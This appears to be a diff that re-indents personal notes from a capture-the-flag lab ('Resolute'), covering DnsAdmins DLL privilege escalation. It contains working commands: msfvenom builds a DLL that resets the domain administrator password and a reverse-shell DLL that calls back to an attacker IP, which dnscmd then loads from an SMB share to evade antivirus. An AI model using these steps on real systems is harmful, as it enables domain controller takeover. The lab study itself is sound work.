@@ -186,66 +186,66 @@ Resolute:
 ###########################################PRIVILEGE ADMIN ESCALATION VIA DNS DLL ###############################################################################################
 
 Exploit DNS DLL Priv Escalation:
-            Check if a user is in DNSAdmins group:
-                net user ryan /domain
+    Check if a user is in DNSAdmins group:
+        net user ryan /domain
 
 
-            We load an arbitrary DLL with SYSTEM privileges on the DNS server. i.e., 
-            We will build a DLL which contains admin priv esc code and inject it into dns.exe process on the victim’s DNS Server (DC).
-            
+    We load an arbitrary DLL with SYSTEM privileges on the DNS server. i.e., 
+    We will build a DLL which contains admin priv esc code and inject it into dns.exe process on the victim’s DNS Server (DC).
+    
 
-            Looks like the server does not even do any verification on the dll path specified in this operation :
-            https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
-            
-                non-staged payload - we just tryed to modify Admin Passwd:
-                    msfvenom -p windows/x64/exec cmd='net user administrator Adib1234@! /domain' -f dll > dnsSecAD.dll
-
-
-            Skip Defender + A.V - Hosting the payload:
-                Once the payload is generated,
-                we will use smb server to host the file. We are choosing this, because windows supports UNC paths and samba shares by default. 
-                Also, there are times when the victim’s AV or defender may delete the payload if uploaded, so we’ll stick with smb server for this one.
-
-                WE REUSE OUR SMB SERVER:
-                    We check if it is joignable from the Windows machine:
-                        Evil-WinRM* PS C:\Users\ryan\Documents> net view \\<KALI IP> 
-                            Shared resources at <KALI IP>
-
-                            (null)
-
-                            Share name  Type  Used as  Comment
-
-                            -------------------------------------------------------------------------------
-                            COOL        Disk  (UNC)
-                            The command completed successfully.
-
-            TO EXECUTE THE DNS SERVICE with the Privilege Admin Escalation Payload:
-                *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.16.28\share\dnsSecAD.dll
-
-                OR IF it fails try:
-                    dnscmd megabank.local /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll
-
-                Then:
-                    sc.exe \\resolute stop dns
-                    sc.exe \\resolute start dns
+    Looks like the server does not even do any verification on the dll path specified in this operation :
+    https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
+    
+        non-staged payload - we just tryed to modify Admin Passwd:
+            msfvenom -p windows/x64/exec cmd='net user administrator Adib1234@! /domain' -f dll > dnsSecAD.dll
 
 
-            We connect with new creds:
-                evil-winrm -i 10.10.10.169 -u administrator  -p Adib1234@!
+    Skip Defender + A.V - Hosting the payload:
+        Once the payload is generated,
+        we will use smb server to host the file. We are choosing this, because windows supports UNC paths and samba shares by default. 
+        Also, there are times when the victim’s AV or defender may delete the payload if uploaded, so we’ll stick with smb server for this one.
+
+        WE REUSE OUR SMB SERVER:
+            We check if it is joignable from the Windows machine:
+                Evil-WinRM* PS C:\Users\ryan\Documents> net view \\<KALI IP> 
+                    Shared resources at <KALI IP>
+
+                    (null)
+
+                    Share name  Type  Used as  Comment
+
+                    -------------------------------------------------------------------------------
+                    COOL        Disk  (UNC)
+                    The command completed successfully.
+
+    TO EXECUTE THE DNS SERVICE with the Privilege Admin Escalation Payload:
+        *Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.16.28\share\dnsSecAD.dll
+
+        OR IF it fails try:
+            dnscmd megabank.local /config /serverlevelplugindll \\10.10.16.28\cool\dnsSecAD.dll
+
+        Then:
+            sc.exe \\resolute stop dns
+            sc.exe \\resolute start dns
 
 
-            Other payload with a reverse shell:
-                Kali:
-                    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.28 LPORT=9001 -f dll > dnsSSH.dll
+    We connect with new creds:
+        evil-winrm -i 10.10.10.169 -u administrator  -p Adib1234@!
 
-                Windows:
-                    *Evil-WinRM* PS C:\Users\ryan\Desktop> cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.16.28\share\dnsSSH.dll
 
-                        Registry property serverlevelplugindll successfully reset.
-                        Command completed successfully.
+    Other payload with a reverse shell:
+        Kali:
+            msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.28 LPORT=9001 -f dll > dnsSSH.dll
 
-                    *Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe stop dns
-                    *Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe start dns
+        Windows:
+            *Evil-WinRM* PS C:\Users\ryan\Desktop> cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.16.28\share\dnsSSH.dll
+
+                Registry property serverlevelplugindll successfully reset.
+                Command completed successfully.
+
+            *Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe stop dns
+            *Evil-WinRM* PS C:\Users\ryan\Desktop> sc.exe start dns
 
 
 
